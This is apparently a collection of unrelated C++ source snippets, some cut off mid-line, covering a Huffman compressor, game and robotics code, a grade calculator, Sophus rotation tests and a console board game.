    "//\u8b1d\u93a7\u99ff B103040021 \n//2022/12/6\n//\u88fd\u4f5c Huffman\u58d3\u7e2e\u8edf\u9ad4\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <map>\n#include <queue>\n#include <vector>\n\nusing namespace std;\n\nvector<unsigned char> RawFile;//\u66ab\u5b58input file\u7684\u8cc7\u6599 \nvector<unsigned char> Result;//result\nmap<unsigned char, int> FreqPerChar; // \u7528\u4f86\u7d71\u8a08\u5404\u500b\u5b57\u5143\u7684\u51fa\u73fe\u6b21\u6578\nmap<unsigned char, string> HuffmanTable;//Huffman Table\nmap<string, unsigned char> DecodeTable;//Decoding Table\nint totalbit = 0;\n\nstruct HuffmanNode {\n    HuffmanNode* LC = NULL;\n    HuffmanNode* RC = NULL;\n    int freq;\n    unsigned char ch;\n    HuffmanNode(unsigned char c, int f) {\n        ch = c;\n        freq = f;\n    }\n};\n\n//sorting\u6bd4\u8f03\u51fd\u5f0f\nstruct cmp {\n    bool operator()(HuffmanNode* n1, HuffmanNode* n2) {\n        //\u6b21\u6578\u76f8\u7b49\u5247\u5b57\u5178\u5e8f\u5c0f\u7684\u512a\u5148\u53d6\u51fa\n        if (n1->freq == n2->freq) {\n            return n1->ch > n2->ch;\n        }\n        return n1->freq > n2->freq;\n    }\n};\n\n//\u5c0b\u627e\u8449\u5b50 \u88fd\u4f5c\u7de8\u78bc\u8868\nvoid DFS(string Code, HuffmanNode* nowNode) {\n    if (nowNode->LC == NULL && nowNode->RC == NULL) {\n        HuffmanTable.emplace(make_pair(nowNode->ch, Code));\n        return;\n    }\n    DFS(Code + '0', nowNode->LC);\n    DFS(Code + '1', nowNode->RC);\n}\n\n//\u9032\u884c\u7de8\u78bc \u6bcf8\u500bbit\u8f49\u6210unsigned char\nvoid Encode() {\n    int cnt = 0;\n    unsigned char tmp = 0;\n    for (auto i : RawFile) {\n        for (int j = 0; j < HuffmanTable[i].size(); j++) {\n            totalbit++;\n            tmp <<= 1;\n            cnt++;\n            tmp += (HuffmanTable[i][j] - '0');\n            if (cnt == 8) {\n                cnt = 0;\n                Result.emplace_back(tmp);\n                tmp = 0;\n            }\n        }\n    }\n    if (cnt) Result.emplace_back(tmp);\n}\n\n//\u89e3\u78bc\u4e26\u8f38\u51fa\u7d50\u679c\nvoid Decode(string FileName) {\n    fstream OutFile;\n    OutFile.open(FileName, ios::out | ios::binary);\n    string buff = \"\";\n    int Prefix = (totalbit / 8) * 8, bitcnt = 0;\n    for (auto i : RawFile) {\n        for (int j = 7; j >= 0; j--) {\n            bitcnt++;\n\n            //\u672a\u5b8c\u6574\u7684byte\u8655\u7406\n            if (bitcnt > Prefix && bitcnt <= Prefix + (8 - totalbit % 8))\n                continue;\n\n            // char to bool\n            buff += (((i >> j) & 1) + '0');\n\n            if (DecodeTable.count(buff)) {\n                OutFile << DecodeTable[buff];\n                buff = \"\";\n            }\n        }\n    }\n    OutFile.close();\n}\n\n//\u8b80\u5165\u8981\u58d3\u7e2e\u7684\u6a94\u6848\nvoid ReadFile(string FileName) {\n    ifstream InputFile;\n    InputFile.open(FileName, ios::in | ios::binary);\n\n    unsigned char ch = InputFile.get();\n    while (InputFile.good()) {\n        RawFile.emplace_back(ch);\n\n        //\u5132\u5b58\u6b21\u6578\n        FreqPerChar[ch]++;\n\n        ch = InputFile.get();\n    }\n    InputFile.close();\n}\n\n//\u8b80\u5165\u58d3\u7e2e\u904e\u7684\u6a94\u6848\nvoid ReadBinFile(string FileName) {\n    ifstream InputFile;\n    InputFile.open(FileName, ios::in | ios::binary);\n    int n = 0;\n\n    int buffC;\n    string buffS;\n\n    // n\u500b\u7de8\u78bc \u8b80\u5165totalbit\u4ee5\u9032\u884c\u672a\u5b8c\u6574\u7684byte\u8655\u7406\n    InputFile >> n >> totalbit;\n\n    for (int i = 0; i < n; i++) {\n        InputFile >> buffC >> buffS;\n        DecodeTable[buffS] = buffC;\n    }\n\n    //\u58d3\u7e2e\u524dbyte,\u58d3\u7e2e\u5f8cbyte,\u58d3\u7e2e\u7387\n    string Before, After, compressRatio;\n    InputFile >> Before >> After >> compressRatio;\n    InputFile.get();\n    unsigned char ch = InputFile.get();\n    while (InputFile.good()) {\n        RawFile.emplace_back(ch);\n        ch = InputFile.get();\n    }\n    InputFile.close();\n}\n\nHuffmanNode* BuildHuffmanTree() {\n    priority_queue<HuffmanNode*, vector<HuffmanNode*>, cmp> pq;\n    for (auto i : FreqPerChar) {\n        pq.push(new HuffmanNode(i.first, i.second));\n    }\n    while (pq.size() != 1) {\n        HuffmanNode *n1, *n2, *tmp;\n        n1 = pq.top();\n        pq.pop();\n        n2 = pq.top();\n        pq.pop();\n        unsigned char cmin = min(n1->ch, n2->ch);\n        tmp = new HuffmanNode(cmin, n1->freq + n2->freq);\n        if (cmin == n1->ch) {\n            tmp->LC = n1;\n            tmp->RC = n2;\n        } else {\n            tmp->RC = n1;\n            tmp->LC = n2;\n        }\n        pq.push(tmp);\n    }\n    return pq.top();\n}\n\nvoid GenZipFile(string FileName) {\n    fstream OutFile;\n    OutFile.open(FileName, ios::out | ios::binary);\n    OutFile << HuffmanTable.size() << ' ' << totalbit << '\\n';\n\n    //\u8f38\u51fa\u7de8\u78bc\u8868\n    for (auto i : HuffmanTable) {\n        cout << i.first << \": \" << i.second << '\\n';\n        OutFile << (int)i.first << ' ' << i.second << '\\n';\n    }\n\n    //\u8a08\u7b97\u4e26\u8f38\u51fa\u58d3\u7e2e\u7387\u53ca\u58d3\u7e2e\u524d\u5f8c\u7684byte\n    OutFile << RawFile.size() << '\\n';\n    int Headersize = 6 + OutFile.tellg();\n    int digit = 0, temp = Headersize + Result.size();\n    while (temp) {\n        temp /= 10;\n        digit++;\n    }\n    int CompressedSize = Result.size() + Headersize + digit + 1;\n    OutFile << CompressedSize << '\\n';\n    OutFile << fixed << setprecision(3) << 1.0 * RawFile.size() / CompressedSize\n            << '\\n';\n\n    cout << \"Origin:\" << RawFile.size() << \"Bytes\\n\";\n    cout << \"Compressed:\" << CompressedSize << \"Bytes\\n\";\n    cout << \"Compression Ratio:\" << 1.0 * RawFile.size() / CompressedSize\n         << '\\n';\n\n    for (auto i : Result) {\n        OutFile << i;\n    }\n    OutFile.close();\n}\n\nvoid Zip(string ",
    "#include \"Unit.h\"\n#include \"Engine.h\"\n\nbool Unit::Initialize()\n{\n    m_CurrentPosition = m_StartPosition;\n    m_TargetPosition = nullopt;\n    m_CurrentRotation = 0.f;\n    m_TargetRotation = 0.f;\n    m_CurrentTexture = make_shared<Texture>();\n    return true;\n}\n\nvoid Unit::Render(sf::RenderWindow& renderer)\n{\n    // debug\n    sf::Vertex directionLine[] = {\n        sf::Vertex(sf::Vector2f(m_CurrentPosition.x, m_CurrentPosition.y)),\n        sf::Vertex(sf::Vector2f(m_CurrentPosition.x + m_Direction.x, m_CurrentPosition.y + m_Direction.y))\n    };\n    Engine::GetSingleton()->DrawLine(directionLine, 2);\n\n    // render correct texture based on rotation\n    if (m_TexturesNames.empty())\n    {\n        return;\n    }\n    float angleStep = 180.f / m_TexturesNames.size();\n    int textureIndex = 0;\n    float angle = m_CurrentRotation;\n    vec2 scale = { 1, 1 };\n    if (angle > 180.f)\n    {\n        angle -= 360.f;\n    }\n    if (angle < 0)\n    {\n        angle = abs(angle);\n        scale = { -1, 1 };\n    }\n    textureIndex = int(angle / angleStep) % m_TexturesNames.size();\n    string textureName = m_TexturePath + m_TexturesNames[textureIndex];\n    shared_ptr<Texture> texture = Engine::GetSingleton()->GetTexture(textureName);\n    if (texture)\n    {\n        m_CurrentTexture = texture;\n        vec2 position = GetPosition();\n        texture->Display(renderer, position, { .DrawScale = scale });\n    }\n}\n\nvoid Unit::CommandMovement(vec2 position)\n{\n    if (m_TargetPosition.has_value() && m_TargetPosition.value() == position)\n    {\n        return;\n    }\n    m_TargetPosition = position;\n}\n\nvoid Unit::RotateToTarget(float deltaTime, float angle)\n{\n    float rotationDiff = angle - m_CurrentRotation;\n    while (rotationDiff > 180.0f) rotationDiff -= 360.0f;\n    while (rotationDiff < -180.0f) rotationDiff += 360.0f;\n\n    float rotationStep = m_RotationSpeed * deltaTime;\n    float finalRotation = 0;\n    if (fabs(rotationDiff) < rotationStep)\n    {\n        finalRotation = angle;\n    }\n    else\n    {\n        finalRotation = m_CurrentRotation + rotationStep * (rotationDiff > 0 ? 1 : -1);\n    }\n    SetRotation(finalRotation);\n}",
    "/*******************************************************************************\n * BSD 3-Clause License\n *\n * Copyright (c) 2019, Los Alamos National Security, LLC\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n * * Redistributions of source code must retain the above copyright notice, this\n *   list of conditions and the following disclaimer.\n *\n * * Redistributions in binary form must reproduce the above copyright notice,\n *   this list of conditions and the following disclaimer in the documentation\n *   and/or other materials provided with the distribution.\n *\n * * Neither the name of the copyright holder nor the names of its\n *   contributors may be used to endorse or promote products derived from\n *   this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE\n * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *******************************************************************************/\n\n/*      Title     : servo.cpp\n *      Project   : moveit_servo\n *      Created   : 3/9/2017\n *      Author    : Brian O'Neil, Andy Zelenak, Blake Anderson\n */\n\n#include <moveit_servo/make_shared_from_pool.h>\n#include <moveit_servo/servo.h>\n\nnamespace moveit_servo\n{\nnamespace\n{\nconst rclcpp::Logger LOGGER = rclcpp::get_logger(\"moveit_servo.servo\");\nconstexpr double ROBOT_STATE_WAIT_TIME = 10.0;  // seconds\n}  // namespace\n\nServo::Servo(const rclcpp::Node::SharedPtr& node, const ServoParameters::SharedConstPtr& parameters,\n             const planning_scene_monitor::PlanningSceneMonitorPtr& planning_scene_monitor)\n  : planning_scene_monitor_{ planning_scene_monitor }\n  , parameters_{ parameters }\n  , servo_calcs_{ node, parameters, planning_scene_monitor_ }\n  , collision_checker_{ node, parameters, planning_scene_monitor_ }\n{\n}\n\nvoid Servo::start()\n{\n  if (!planning_scene_monitor_->getStateMonitor()->waitForCompleteState(parameters_->move_group_name,\n                                                                        ROBOT_STATE_WAIT_TIME))\n  {\n    RCLCPP_ERROR(LOGGER, \"Timeout waiting for current state\");\n    return;\n  }\n\n  setPaused(false);\n\n  // Crunch the numbers in this timer\n  servo_calcs_.start();\n\n  // Check collisions in this timer\n  if (parameters_->check_collisions)\n    collision_checker_.start();\n}\n\nServo::~Servo()\n{\n  setPaused(true);\n}\n\nvoid Servo::setPaused(bool paused)\n{\n  servo_calcs_.setPaused(paused);\n  collision_checker_.setPaused(paused);\n}\n\nbool Servo::getCommandFrameTransform(Eigen::Isometry3d& transform)\n{\n  return servo_calcs_.getCommandFrameTransform(transform);\n}\n\nbool Servo::getCommandFrameTransform(geometry_msgs::msg::TransformStamped& transform)\n{\n  return servo_calcs_.getCommandFrameTransform(transform);\n}\n\nbool Servo::getEEFrameTransform(Eigen::Isometry3d& transform)\n{\n  return servo_calcs_.getEEFrameTransform(transform);\n}\n\nbool Servo::getEEFrameTransform(geometry_msgs::msg::TransformStamped& transform)\n{\n  return servo_calcs_.getEEFrameTransform(transform);\n}\n\nconst ServoParameters::SharedConstPtr& Servo::getParameters() const\n{\n  return parameters_;\n}\n\n}  // namespace moveit_servo\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n#include \"AbilitySystem/Abilities/WEnemyGameplayAbility.h\"\n#include \"Characters/WEnemyCharacter.h\"\n#include \"AbilitySystem/WAbilitySystemComponent.h\"\n#include \"WGameplayTags.h\"\n\nAWEnemyCharacter* UWEnemyGameplayAbility::GetEnemyCharacterFromActorInfo() const\n{\n\t// if (!CachedEnemyCharacter.IsValid())\n\t// {\n\t//     CachedEnemyCharacter = Cast<AWEnemyCharacter>(CurrentActorInfo->AvatarActor);\n\t// }\n\t// return CachedEnemyCharacter.IsValid() ? CachedEnemyCharacter.Get() : nullptr;\n\tif (!ensure(CurrentActorInfo))\n\t{\n\t\treturn nullptr;\n\t}\n\n\treturn CastChecked<AWEnemyCharacter>(CurrentActorInfo->AvatarActor.Get());\n}\n\nUEnemyCombatComponent* UWEnemyGameplayAbility::GetEnemyCombatComponentFromActorInfo() const\n{\n\tif (!ensure(CurrentActorInfo))\n\t{\n\t\treturn nullptr;\n\t}\n\n\treturn GetEnemyCharacterFromActorInfo()->GetEnemyCombatComponent();\n}\n\nFGameplayEffectSpecHandle UWEnemyGameplayAbility::MakeEnemyDamageEffectSpecHandle(TSubclassOf<UGameplayEffect> EffectClass, const FScalableFloat& InDamageScalableFloat) const\n{\n\tcheck(EffectClass);\n\n\tUWAbilitySystemComponent* ASC = GetWAbilitySystemComponentFromActorInfo();\n\tAActor* AvatarActor\t\t\t  = GetAvatarActorFromActorInfo();\n\n\tFGameplayEffectContextHandle ContextHandle = ASC->MakeEffectContext();\n\tContextHandle.SetAbility(this);\n\tContextHandle.AddSourceObject(AvatarActor);\n\tContextHandle.AddInstigator(AvatarActor, AvatarActor);\n\n\tFGameplayEffectSpecHandle EffectSpecHandle = ASC->MakeOutgoingSpec(EffectClass, GetAbilityLevel(), ContextHandle);\n\n\tEffectSpecHandle.Data->SetSetByCallerMagnitude(WTags::Shared_SetByCaller_BaseDamage, InDamageScalableFloat.GetValueAtLevel(GetAbilityLevel()));\n\n\treturn EffectSpecHandle;\n}",
    "//FA2023_FinalGradeApplication_Mahto.cpp                 \r\n#include<iostream>//Headers Required\r\n#include<iomanip>\r\n#include<array>\r\n#include<string>\r\n#include<fstream>\r\n#include<sstream>\r\nusing namespace std;\r\nint displaymenu() {//To display menu to users for selecting their task\r\n\tint task;\t\r\n\t\tcout << \"FA2023_FinalGradeApplication_Mahto.cpp\" << endl;\r\n\t\tcout << \"TASKS OF GRADING - ABHASH MAHTO\" << endl;\r\n\t\tcout << \"---------------------------------------------------------------------------\" << endl;\r\n\t\tcout << \"1.Grading One Student \" << endl;\r\n\t\tcout << \"2.Search one Student Grade from Printing The Grade of One Student\" << endl;\r\n\t\tcout << \"3.Printing The Grades of Class\" << endl;\r\n\t\tcout << \"O.Exit\" << endl;\r\n\t\tcout << \"Enter Your Task\" << endl;\r\n\t\tcin >> task;//Asking user for task\r\n\t\treturn task;//Returning task to main \r\n}\r\nint* size(string ASSIGNMENT_NAMES[]) {//To get the number of Assignments of each category\r\n\tstatic int assignment_size[7];\r\n\t \r\n\t\r\n\tfor (int i = 0; i < 7; i++) {\r\n\t\tcout << \"Enter number of \" << ASSIGNMENT_NAMES[i] << endl;\r\n\t\tcin >> assignment_size[i];\r\n\t}\r\n\t\r\n\treturn assignment_size;\r\n}\r\nfloat* maxx(string ASSIGNMENT_NAMES[],int* assignment_size ) {//To get max score of each assignment type \r\n\tstatic float max[7];\r\n\tfloat score = 0;\r\n\tfor (int i = 0; i < 7; i++) {\r\n\t\tcout << \"Enter max score of one \" << ASSIGNMENT_NAMES[i] << endl;\r\n\t\tcin >> score;\r\n\t\tmax[i] = score * assignment_size[i];\r\n\t}\r\n\treturn max;\r\n}\r\nvoid task1(string ASSIGNMENT_NAMES [],int* assignment_size, float* max) {//To record each student score in user's desired file\r\n\tchar decision;//To make the function re do if user's wants to input another student's grade\r\n\tdo {\r\n\t\tchar choice;\r\n\t\tofstream outfile;\r\n\t\tstring  course, student_id, L_student_name, F_student_name, filename;\r\n\t\tfloat bonus, sum = 0, Total_Sum = 0;\r\n\t\tfloat Total_max = 0;\r\n\t\tfloat studentScores[7] = { 0 };\r\n\t\tstring scoreString[7];\r\n\t\tfloat score;\r\n\t\tfloat numgrade = 0;\r\n\t\tchar letter_Grade;\r\n\t\tstringstream Total_MAX;\r\n\t\tcout << \"Enter Course Name\" << endl;//Asking basic info of student\r\n\t\tcin >> course;\r\n\t\tcout << \"Enter Student ID\" << endl;\r\n\t\tcin >> student_id;\r\n\t\tcout << \"Enter Your Student First Name\" << endl;\r\n\t\tcin >> F_student_name;\r\n\t\tcout << \"Enter Your Student Last Name\" << endl;\r\n\t\tcin >> L_student_name;\r\n\t\tcout << \"Enter Bonus Score For Policy Quiz\" << endl;\r\n\t\tcin >> bonus;\r\n\t\tfor (int i = 0; i < 7; i++) {\r\n\t\t\tstringstream ScoresString;\r\n\t\t\tsum = 0;\r\n\t\t\tcout << \"Enter \" << ASSIGNMENT_NAMES[i] << \" scores\" << endl;//To get score of each assignment type\r\n\t\t\tfor (int j = 0; j < assignment_size[i]; j++) {//To get score of each test of a assignment type\r\n\t\t\t\tcout << \"Enter Score for \" << j + 1 << \" Test\" << endl;\r\n\t\t\t\tcin >> score;\r\n\t\t\t\tsum = sum + score;//To store the value of total score of one assignmnet type\r\n\t\t\t\tScoresString << score << \" \";//To display each test score\r\n\t\t\t\tif (j == assignment_size[i] - 1) {\r\n\t\t\t\t\tstudentScores[i] = sum;//Assigning total score of each assignment type\r\n\t\t\t\t\tscoreString[i] = ScoresString.str();//Assigning test score of all tests of each assignment type\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tfor (int i = 0; i < 7; i++) {\r\n\t\t\tTotal_Sum = studentScores[i] + Total_Sum;//To calculate total score of a stdeunt after all test scores are given to program\r\n\t\t}\r\n\t\tTotal_Sum += bonus;//Adding policy quiz score to total sum\r\n\t\tfor (int i = 0; i < 7; i++) {\r\n\t\t\tTotal_max = max[i] + Total_max;//To calculate total max score of a course\r\n\t\t}\r\n\t\tTotal_MAX << Total_max;\r\n\t\tstring MAX = Total_MAX.str();//To display it as a string \r\n\r\n\t\tnumgrade = 100 * (Total_Sum / Total_max);//To decide the letter grade of a student\r\n\t\tif (numgrade >= 90)\r\n\t\t\tletter_Grade = 'A';\r\n\t\telse if (numgrade >= 80 && numgrade <= 89)\r\n\t\t\tletter_Grade = 'B';\r\n\t\telse if (numgrade >= 70 && numgrade <= 79)\r\n\t\t\tletter_Grade = 'C';\r\n\t\telse if (numgrade >= 60 && numgrade <= 69)\r\n\t\t\tletter_Grade = 'D';\r\n\t\telse\r\n\t\t\tletter_Grade = 'F';\r\n\t\tcout << \"FA2023_FinalGradeApplication_Mahto.java\" << endl;\r\n\t\tcout << \"FINAL GRADE OF STUDENT - ABHASH MAHTO\" << endl;\r\n\t\tcout << \"---------------------------------------------------------------------------------------------\" << endl;\r\n\t\tcout << left << setw(20) << \"COURSE NAME:\" << course << endl;\r\n\t\tcout << left << setw(20) << \"STUDENT ID:\" << student_id << endl;\r\n\t\tcout << left << setw(20) << \"STUDENT NAME:\" << F_student_name << \" \" << L_student_name << endl;\r\n\t\tcout << \"--------------------------------------------------------------------------------------------\" << endl;\r\n\t\tcout << left << setw(20) << \"EXTRA CREDIT:\" << fixed << setprecision(2) << bonus << endl;\r\n\t\tcout << left << setw(20) << \"QUIZZES:\" << scoreString[0] << endl;\r\n\t\tcout << left << setw(20) << \"HOMEWORK:\" << scoreString[1] << endl;\r\n\t\tcout << left << setw(20) << \"LABS:\" << scoreString[2] << endl;\r\n\t\tcout << left << setw(20) << \"PROJECT:\" << scoreString[3] << endl;\r\n\t\tcout << left << setw(20) << \"DISCUSSION:\" << scoreString[4] << endl;\r\n\t\tcout << left << setw(20) << \"TE",
    "#include <iostream>\n\n#include <sophus/interpolate.hpp>\n#include <sophus/so3.hpp>\n#include \"tests.hpp\"\n\n// Explicit instantiate all class templates so that all member methods\n// get compiled and for code coverage analysis.\nnamespace Eigen {\ntemplate class Map<Sophus::SO3<double>>;\ntemplate class Map<Sophus::SO3<double> const>;\n}  // namespace Eigen\n\nnamespace Sophus {\n\ntemplate class SO3<double, Eigen::AutoAlign>;\ntemplate class SO3<float, Eigen::DontAlign>;\n#if SOPHUS_CERES\ntemplate class SO3<ceres::Jet<double, 3>>;\n#endif\n\ntemplate <class Scalar>\nclass Tests {\n public:\n  using SO3Type = SO3<Scalar>;\n  using Point = typename SO3<Scalar>::Point;\n  using Tangent = typename SO3<Scalar>::Tangent;\n  Scalar const kPi = Constants<Scalar>::pi();\n\n  Tests() {\n    so3_vec_.push_back(SO3Type(Eigen::Quaternion<Scalar>(\n        Scalar(0.1e-11), Scalar(0.), Scalar(1.), Scalar(0.))));\n    so3_vec_.push_back(SO3Type(Eigen::Quaternion<Scalar>(\n        Scalar(-1), Scalar(0.00001), Scalar(0.0), Scalar(0.0))));\n    so3_vec_.push_back(\n        SO3Type::exp(Point(Scalar(0.2), Scalar(0.5), Scalar(0.0))));\n    so3_vec_.push_back(\n        SO3Type::exp(Point(Scalar(0.2), Scalar(0.5), Scalar(-1.0))));\n    so3_vec_.push_back(SO3Type::exp(Point(Scalar(0.), Scalar(0.), Scalar(0.))));\n    so3_vec_.push_back(\n        SO3Type::exp(Point(Scalar(0.), Scalar(0.), Scalar(0.00001))));\n    so3_vec_.push_back(SO3Type::exp(Point(kPi, Scalar(0), Scalar(0))));\n    so3_vec_.push_back(\n        SO3Type::exp(Point(Scalar(0.2), Scalar(0.5), Scalar(0.0))) *\n        SO3Type::exp(Point(kPi, Scalar(0), Scalar(0))) *\n        SO3Type::exp(Point(Scalar(-0.2), Scalar(-0.5), Scalar(-0.0))));\n    so3_vec_.push_back(\n        SO3Type::exp(Point(Scalar(0.3), Scalar(0.5), Scalar(0.1))) *\n        SO3Type::exp(Point(kPi, Scalar(0), Scalar(0))) *\n        SO3Type::exp(Point(Scalar(-0.3), Scalar(-0.5), Scalar(-0.1))));\n    tangent_vec_.push_back(Tangent(Scalar(0), Scalar(0), Scalar(0)));\n    tangent_vec_.push_back(Tangent(Scalar(1), Scalar(0), Scalar(0)));\n    tangent_vec_.push_back(Tangent(Scalar(0), Scalar(1), Scalar(0)));\n    tangent_vec_.push_back(\n        Tangent(Scalar(kPi / 2.), Scalar(kPi / 2.), Scalar(0)));\n    tangent_vec_.push_back(Tangent(Scalar(-1), Scalar(1), Scalar(0)));\n    tangent_vec_.push_back(Tangent(Scalar(20), Scalar(-1), Scalar(0)));\n    tangent_vec_.push_back(Tangent(Scalar(30), Scalar(5), Scalar(-1)));\n\n    point_vec_.push_back(Point(Scalar(1), Scalar(2), Scalar(4)));\n    point_vec_.push_back(Point(Scalar(1), Scalar(-3), Scalar(0.5)));\n  }\n\n  void runAll() {\n    bool passed = testLieProperties();\n    passed &= testUnity();\n    passed &= testRawDataAcces();\n    passed &= testConstructors();\n    passed &= testSampleUniformSymmetry();\n    passed &= testFit();\n    processTestResult(passed);\n  }\n\n private:\n  bool testLieProperties() {\n    LieGroupTests<SO3Type> tests(so3_vec_, tangent_vec_, point_vec_);\n    return tests.doAllTestsPass();\n  }\n\n  bool testUnity() {\n    bool passed = true;\n    // Test that the complex number magnitude stays close to one.\n    SO3Type current_q;\n    for (size_t i = 0; i < 1000; ++i) {\n      for (SO3Type const& q : so3_vec_) {\n        current_q *= q;\n      }\n    }\n    SOPHUS_TEST_APPROX(passed, current_q.unit_quaternion().norm(), Scalar(1),\n                       Constants<Scalar>::epsilon(), \"Magnitude drift\");\n    return passed;\n  }\n\n  bool testRawDataAcces() {\n    bool passed = true;\n    Eigen::Matrix<Scalar, 4, 1> raw = {Scalar(0), Scalar(1), Scalar(0),\n                                       Scalar(0)};\n    Eigen::Map<SO3Type const> map_of_const_so3(raw.data());\n    SOPHUS_TEST_APPROX(passed,\n                       map_of_const_so3.unit_quaternion().coeffs().eval(), raw,\n                       Constants<Scalar>::epsilon());\n    SOPHUS_TEST_EQUAL(\n        passed, map_of_const_so3.unit_quaternion().coeffs().data(), raw.data());\n    Eigen::Map<SO3Type const> const_shallow_copy = map_of_const_so3;\n    SOPHUS_TEST_EQUAL(passed,\n                      const_shallow_copy.unit_quaternion().coeffs().eval(),\n                      map_of_const_so3.unit_quaternion().coeffs().eval());\n\n    Eigen::Matrix<Scalar, 4, 1> raw2 = {Scalar(1), Scalar(0), Scalar(0),\n                                        Scalar(0)};\n    Eigen::Map<SO3Type> map_of_so3(raw.data());\n    Eigen::Quaternion<Scalar> quat;\n    quat.coeffs() = raw2;\n    map_of_so3.setQuaternion(quat);\n    SOPHUS_TEST_APPROX(passed, map_of_so3.unit_quaternion().coeffs().eval(),\n                       raw2, Constants<Scalar>::epsilon());\n    SOPHUS_TEST_EQUAL(passed, map_of_so3.unit_quaternion().coeffs().data(),\n                      raw.data());\n    SOPHUS_TEST_NEQ(passed, map_of_so3.unit_quaternion().coeffs().data(),\n                    quat.coeffs().data());\n    Eigen::Map<SO3Type> shallow_copy = map_of_so3;\n    SOPHUS_TEST_EQUAL(passed, shallow_copy.unit_quaternion().coeffs().eval(),\n                      map_of_so3.unit_quaternion().coeffs().eval());\n\n    SO3Type const const_so3(qua",
    "#include <iostream> // Include the input-output library for console operations\n\nusing namespace std; // Use the standard namespace to avoid prefixing with 'std::'\n\n// Global 2D array representing the game board\nchar A[19][19]; // Initialize a 19x19 character array to represent the game board\n\n// Function to initialize the game screen with player positions and walls\nint screen(int ip, int jp, int ir, int jr)\n{\n    // Variables for iterating through the board and initializing positions\n    int m = 2, n = 2, q = 2, w = 1;\n    \n    // Set initial markers on the board (Columns for walls and moves)\n    A[0][0] = '*'; // Top left corner marker\n    A[0][2] = 'a'; // Column labels for wall placements\n    A[0][4] = 'b';\n    A[0][6] = 'c';\n    A[0][8] = 'd';\n    A[0][10] = 'e';\n    A[0][12] = 'f';\n    A[0][14] = 'g';\n    A[0][16] = 'h';\n    A[0][18] = 'i';\n\n    // Set row markers for wall placements\n    A[2][0] = 'A'; // Row labels for wall placements\n    A[4][0] = 'B';\n    A[6][0] = 'C';\n    A[8][0] = 'D';\n    A[10][0] = 'E';\n    A[12][0] = 'F';\n    A[14][0] = 'G';\n    A[16][0] = 'H';\n    A[18][0] = 'I';\n\n    // Initialize the board with 'O' for empty spaces\n    while (m < 19)\n    {\n        n = 2; // Start from the second column\n        while (n < 19)\n        {\n            A[m][n] = 'O'; // Set each cell to 'O'\n            n = n + 2; // Move to the next column\n        }\n        m = m + 2; // Move to the next row\n    }\n\n    // Set initial player positions\n    A[ip][jp] = 'P'; // Player P position\n    A[ir][jr] = 'R'; // Player R position\n}\n\n// Main function to run the game\nint main()\n{\n    // Variables to control game flow and player actions\n    int n = 0;        // Turn counter\n    int a = 0, b = 0; // Menu selection variables\n    int c = 0, d = 0; // Move and wall options\n    int ip = 2, jp = 10; // Initial position for Player P\n    int ir = 18, jr = 10; // Initial position for Player R\n    int Woodr = 10, Woodp = 10; // Available walls for each player\n    int column = 0, row = 0; // Wall placement positions\n    int istar1 = 0, jstar1 = 0, istar2 = 0, jstar2 = 0; // Coordinates for wall placements\n\n    // Display game start menu\n    cout << \"1.Start Game\" << endl << \"2.Exit\" << endl;\n    cout << \"Please Choose Number: \";\n    cin >> a;\n    cout << endl;\n\n    // Validate menu selection\n    while (a < 1 || a > 2)\n    {\n        cout << \"Please Choose Correct Number: \";\n        cin >> a;\n    }\n\n    // Initialize game board with players' positions\n    screen(ip, jp, ir, jr);\n\n    // Display initial game board state\n    for (int i = 0; i < 19; i++)\n    {\n        for (int j = 0; j < 19; j++)\n        {\n            cout << A[i][j] << \"  \"; // Print each cell value\n        }\n        cout << endl; // New line for the next row\n    }\n\n    // If the player chooses to exit\n    if (a == 2)\n    {\n        cout << \"End!\"; // Display end message\n        return 0; // Exit the program\n    }\n    else // If the player chooses to start the game\n    {\n        // Game loop\n        while (1) // Infinite loop until break conditions are met\n        {\n            if (n % 2 == 0) // Player R's turn (even turn count)\n            {\n                // Display Player R's turn options\n                cout << endl << \"Player R\" << endl;\n                cout << endl << \"1.Add Wall\" << endl << \"2.Move\" << endl;\n                cout << \"Please Choose Number: \";\n                cin >> b;\n\n                // Validate Player R's choice\n                while (b < 1 || b > 2)\n                {\n                    cout << \"Please Choose Correct Number: \";\n                    cin >> b;\n                }\n\n                if (b == 1) // If Player R chooses to add a wall\n                {\n                    if (Woodr > 0) // Check if Player R has walls left\n                    {\n                        // Display wall placement options\n                        cout << endl << \"R Wood number is \" << Woodr;\n                        cout << endl << endl << \"1.Horizontal\" << endl << \"2.Vertical\" << endl;\n                        cout << \"Please Choose Number: \";\n                        cin >> d;\n                        // Validate wall placement direction\n                    \n                        while (d < 1 || d > 2)\n                        {\n                            cout << \"Please Choose Correct Number: \"; // Prompt user for correct input\n                            cin >> d;\n                        }\n\n                        if (d == 1) // If Player R chooses to place a horizontal wall\n                        {\n                            // Prompt user to choose the column for wall placement\n                            cout << endl << \"1.a\" << \"    \" << \"2.b\" << \"    \" << \"3.c\" << \"    \" << \"4.d\" << \"    \" << \"5.e\" << \"    \" << \"6.f\" << \"    \" << \"7.g\" << \"    \" << \"8.h\" << endl;\n                            cout << \"Please Choose Number: \";\n                            cin >> column;\n                            cout << endl;\n\n                            // Valid",
